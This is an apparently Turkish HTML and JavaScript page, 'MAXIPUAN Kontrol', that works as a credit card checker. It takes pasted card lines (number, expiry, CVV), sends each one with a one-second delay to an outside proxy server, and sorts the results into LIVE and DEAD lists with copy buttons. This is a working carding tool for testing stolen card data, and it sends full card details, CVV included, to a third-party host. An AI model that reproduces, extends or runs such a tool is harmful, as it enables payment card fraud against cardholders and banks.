<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>MAXIPUAN Kontrol</title>
  <style>
    body {
      background-color: #111;
      color: #eee;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    textarea {
      width: 90%;
      height: 150px;
      margin-bottom: 10px;
      background: #222;
      color: #0f0;
      border: 1px solid #555;
      padding: 10px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      margin: 5px;
      cursor: pointer;
      background-color: #444;
      color: white;
      border: none;
      border-radius: 5px;
    }
    #live, #dead {
      white-space: pre-wrap;
      margin-top: 10px;
      text-align: left;
      width: 90%;
      margin: auto;
      background-color: #1a1a1a;
      padding: 10px;
      border: 1px solid #444;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <h1>üí≥ MAXIPUAN KONTROL</h1>
  <textarea id="cards" placeholder="Kartlarƒ± buraya yaz: 4543xxxxxxxxxxxx|05|2027|000"></textarea><br>
  <button onclick="start()">Kontrol Et</button>
  <button onclick="copy('live')">‚úÖ LIVE Kopyala</button>
  <button onclick="copy('dead')">‚ùå DEAD Kopyala</button>

  <h2>‚úÖ LIVE</h2>
  <div id="live"></div>

  <h2>‚ùå DEAD</h2>
  <div id="dead"></div>

  <script>
    async function start() {
      const cards = document.getElementById('cards').value.trim().split('\n');
      document.getElementById('live').textContent = '';
      document.getElementById('dead').textContent = '';

      for (let card of cards) {
        if (!card) continue;

        try {
          const res = await fetch(`https://hzquarex-fa1j.onrender.com/proxy?card=${encodeURIComponent(card)}`);
          const text = await res.text();

          if (text.includes('‚úÖ')) {
            document.getElementById('live').textContent += text + '\n';
          } else {
            document.getElementById('dead').textContent += text + '\n';
          }
        } catch (e) {
          document.getElementById('dead').textContent += `‚ùå ${card} => HATA\n`;
        }

        await new Promise(r => setTimeout(r, 1000)); // istekler arasƒ±nda 1 sn bekle
      }
    }

    function copy(id) {
      const content = document.getElementById(id).textContent;
      navigator.clipboard.writeText(content).then(() => {
        alert(`${id.toUpperCase()} kopyalandƒ±`);
      });
    }
  </script>
</body>
</html>
